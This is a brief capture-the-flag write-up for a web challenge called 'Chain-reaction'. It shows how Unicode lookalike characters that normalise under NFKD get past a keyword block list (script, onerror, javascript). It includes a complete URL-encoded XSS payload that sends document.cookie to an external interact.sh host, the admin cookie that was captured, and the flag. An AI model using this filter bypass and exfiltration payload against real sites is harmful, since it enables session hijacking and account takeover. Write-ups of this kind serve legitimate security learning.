
## Chain-reaction

### Brainstorm 

- Unicode Characters cause register/login behave weird ? SQLAlchemy
- Escape characters done wrong ?? ( XSS )
- Static session ?? 


### Enumeration

- Unicode using NFKD 
https://docs.python.org/3/library/unicodedata.html



- Bad characters blocking

```
<
>
onclick
script
onerror
onfocuss
javascript
```

https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html

s = "%ef%bd%93"
< = "%ef%b9%a4"
> = "%ef%b9%a5"
r= "%ef%bd%92"
i = %e1%b5%a2
p= "%ef%bd%90"
t = "%ef%bd%94"
/ = "%ef%bc%8f"

XSS payload:
```
AAAA%22%ef%b9%a5+%ef%b9%a4%ef%bd%93c%ef%bd%92%e1%b5%a2%ef%bd%90%ef%bd%94%ef%b9%a5+var%20i%3Dnew%20Image%3Bi.src%3D%22https%3A%2F%2Fc578mgayedf00008arh0gnuwkeryyyyyb.interact.sh%2F%3F%22%2Bdocument.cookie%3B+%ef%b9%a4%ef%bc%8f%ef%bd%93c%ef%bd%92%e1%b5%a2%ef%bd%90%ef%bd%94%ef%b9%a5
```

GET /?admin-cookie=sup3rs3cur34dm1nc00k13 HTTP/2.0

Flag: DUCTF{_un1c0de_bypass_x55_ftw!}